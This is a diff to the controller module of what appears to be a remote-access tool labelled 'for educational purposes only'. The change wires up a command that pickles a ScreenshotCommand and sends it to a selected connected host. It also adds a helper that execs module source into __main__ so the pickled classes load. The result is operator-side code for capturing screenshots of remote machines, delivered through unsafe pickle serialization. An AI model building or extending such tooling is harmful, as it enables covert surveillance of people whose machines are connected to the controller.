@@ -12,14 +12,22 @@ the use of this tool is for educational purposes only.
 """
 
 # Built-in/Generic Imports.
+import sys
 from enum import Enum, auto
 from operator import attrgetter
 from time import sleep
 from typing import List
 
+import inspect
+from importlib import util
+
+import __main__
+
 # Modules.
 from config.network import network_conf # pylint: disable=import-error
 from commands.command import Command # pylint: disable=import-error
+import commands.window
+from commands.window import ScreenshotCommand # pylint: disable=import-error
 from utils.misc.encoder import Pickle # pylint: disable=import-error
 from utils.misc.threading import threadpooled # pylint: disable=import-error
 from utils.net.capture import get_ipv4_capture # pylint: disable=import-error
@@ -38,7 +46,28 @@ class HostStatus(Enum):
     Listening = 0
     Connected = auto()
     Disconnected = auto()
+    
+def _mainify_command(mod: object) -> None:
+    """_summary_
 
+    Args:
+        mod (object): _description_
+    """
+
+    mod_source = inspect.getsource(mod)
+    mod_spec = util.spec_from_loader(mod.__name__, loader=None)
+    mod_type = util.module_from_spec(mod_spec)
+    exec(mod_source, __main__.__dict__)
+    sys.modules[mod.__name__] = mod_type
+    globals()[mod.__name__] = mod_type
+    
+def _mainify_commands() -> None:
+    """_summary_
+    """
+    
+    for mod in [commands.window]:
+        _mainify_command(commands.window)
+    
 def _update_btns_host_connected(top_level: object) -> None:
     """_summary_
     """
@@ -48,7 +77,7 @@ def _update_btns_host_connected(top_level: object) -> None:
         # If host is connected to.
 
         # Top-left buttons - enabling all.
-        top_level.top_col_frame_1.btn_1.enable_btn()
+        # top_level.top_col_frame_1.btn_1.enable_btn()
         top_level.top_col_frame_1.btn_2.enable_btn()
         top_level.top_col_frame_1.btn_3.enable_btn()
         top_level.top_col_frame_1.btn_4.enable_btn()
@@ -62,7 +91,7 @@ def _update_btns_host_connected(top_level: object) -> None:
         # If host is not connected.
 
         # Top-left buttons.
-        top_level.top_col_frame_1.btn_1.disable_btn()
+        # top_level.top_col_frame_1.btn_1.disable_btn()
         top_level.top_col_frame_1.btn_2.disable_btn()
         top_level.top_col_frame_1.btn_3.disable_btn()
         top_level.top_col_frame_1.btn_4.disable_btn()
@@ -277,5 +306,13 @@ def btn_listen(top_level: object) -> None:
 def btn_send_command_screenshot(top_level: object) -> None:
     """_summary_
     """
+    
+    host_addr, host_port = attrgetter(
+        'ipv4_addr', 'port'
+    )(network_conf.conf['selected_host'])
+    
+    pickled_command = Pickle.enc(ScreenshotCommand())
 
-    # network_conf.conf['selected_host'].connection.send('test')
+    IfaWrapper.edit_host(host_addr, host_port, 'command', pickled_command)
+
+_mainify_commands()
